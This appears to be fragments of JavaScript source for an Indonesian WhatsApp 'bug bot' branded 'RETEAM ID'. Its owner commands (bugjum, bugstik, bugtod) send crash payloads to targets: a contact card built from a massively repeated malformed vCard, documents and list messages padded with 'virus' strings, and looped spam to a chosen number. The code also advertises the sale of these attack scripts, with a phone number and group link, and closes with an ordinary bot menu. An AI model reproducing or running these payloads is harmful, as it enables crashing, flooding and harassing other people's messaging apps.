Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "Created Rc Modder"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "Created Rc Modder"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "Created Rc Modder"}, {quoted: a})
...
user.afkReason = text
reply(`${m.pushName} RC MODDER Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugjum2': case 'bugstik': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
...
m.reply(`Mampus ${jumlah}`)
}
break
//=================================================//
case 'bugjum': case 'bugie': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `RezaAkbar`, orderTitle: 'POWERED BY RETEAM ID', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `Beli Script Bug`,
url: 'https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS'
}
},
{
quickReplyButton: {
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `POWERED BY RETEAM.ID${ngazap(prefix)}.BIN`, title: `POWERED BY RETEAM.ID${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugtod': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© POWERED BY RETEAM ID${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:POWERED BY RETEAM ID\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
...
\n\n*WELCOME\n\n
bugcrot
bugahay `, `POWERED BY RETEAM ID${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
touchmebre = [
{
title: ` POWERED BY RETEAM.ID ${buttonvirus} ${buttonvirus}`,
rows: [
...
haikal.sendListMsg(m.chat, `POWERED BY RETEAM.ID`, haikal.user.name, `Hay Kak Beli Script Bot War Adia Di List`, `Click Here 🌷`, touchmebre, m)
break
//=================================================//
case 'v1': {
if (!isCreator) throw sticOwner(from)
...
let btn = [{
urlButton: {
displayText: 'Beli Script Bot War',
url: 'https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6281331265675'
}
}, {
quickReplyButton: {
...
➢ Jual Script Bot All Bug
➢ Nomor kosong/Nokos
➢ Wa mod anti bug clone/unclone

BUY SC BUG BOT RINGAN, VITUR BUG NEW + WA KEBAL ALL BUG & VIRUS

HUB : wa.me/6281331265675
...
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `${ucapanWaktu} ${pushname}  ${m.sender.split('@')[0]}\n\n Status : ${isCreator ? 'Owner' : 'User'}`,
description: " ",
buttonText: "Tap!",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "Menampilkan List Bug",
"rows": [
{
"title": "Turu Maneh",
"description": "Bug Pribadi Milik RezaModder",
"rowId": `${prefix}reza`
}
]
},
{
"title": "Menampilkan List Download",
"rows": [
{
"title": "Downloader",
"description": "Menu Unduhan",
"rowId": `${prefix}maudonlot`
}
]
},
{
"title": "Menampilkan List Rpg",
"rows": [
{
"title": "Rpg",
"description": "Games Rpg",
"rowId": `${prefix}repeg`
}
]
},
{
"title": "Menampilkan List Grup/Tools",
"rows": [
{
"title": "Group Menu Admin",
"description": "Admin Punya Fitur Kicked",
"rowId": `${prefix}kangkick`
}
]
},
{
"title": "Menampilkan List Asupan",
"rows": [
{
"title": "Asupan",
"description": "Stop Pmo!",
"rowId": `${prefix}luwhsange`
}
]
},
{
"title": "Menampilkan List Primbon/Weton",
"rows": [
{
"title": "Weton",
"description": "Berbagai Cara Melihat Kelahiranmu",
"rowId": `${prefix}wetonecoy`
}
]
},
{
"title": "Menampilkan List Gabut",
"rows": [
{
"title": "Gabut Menu",
"description": "Cek Kegabutanmu",
"rowId": `${prefix}lealeo`
}
]
},
{
"title": "Menampilkan List Islamic",
"rows": [
{
"title": "List Islamic",
"description": "Menu Tobat Permanent",
"rowId": `${prefix}tobatyuk`
}
]
},
{
"title": "Menampilkan List Owner",
"rows": [
{
"title": "Khusus Owner",
"description": "Suka Suka Owner",
"rowId": `${prefix}seterahlah`
}
]
},
{
"title": "Menampilkan List Berita Terkini",
"rows": [
{
"title": "Newspaper",
"description": "Baca Berita Dengan Fitur Ini",
"rowId": `${prefix}dubbingjowo`
}
]
},
{
"title": "Menampilkan List Add Command",
"rows": [
{
"title": "List Addcmd",
"description": "Sesuka Hati Mau Add Cintamu Juga Boleh",
"rowId": `${prefix}mesecmd`
}
]
},
{
"title": "Menampilkan List Searching Command",
"rows": [
{
"title": "Search Image",
"description": "Mencari Foto",
"rowId": `${prefix}startsearch`
}
]
},
{
"title": "Menampilkan List Converter Audio",
"rows": [
{
"title": "Convert Audio",
"description": "Mengkonversi Audio Berbagai Suara",
"rowId": `${prefix}konversivn`
}
]
},
{
"title": "Menampilkan List Converter Sticker/Image",
"rows": [
{
"title": "Converter Sticker/Image",
"description": "Mengkonversi Sticker/Image",
"rowId": `${prefix}convert`
}
]
},
{
"title": "Menampilkan List Sound",
"rows": [
{
"title": "Sound",
"description": "Berbagai Macam Sound",
"rowId": `${prefix}ngesound`
}
]
},
{
"title": "Menampilkan List Mencari Teman",
"rows": [
{
"title": "Anonymous",
"description": "Mencari Teman Berbagai Negara",
"rowId": `${prefix}nomius`
}
]
},
{
"title": "Menampilkan List Random Image",
"rows": [
{
"title": "Random Image",
"description": "Ngacha Image Seupuasnya",
"rowId": `${prefix}ngacha`
}
]
},
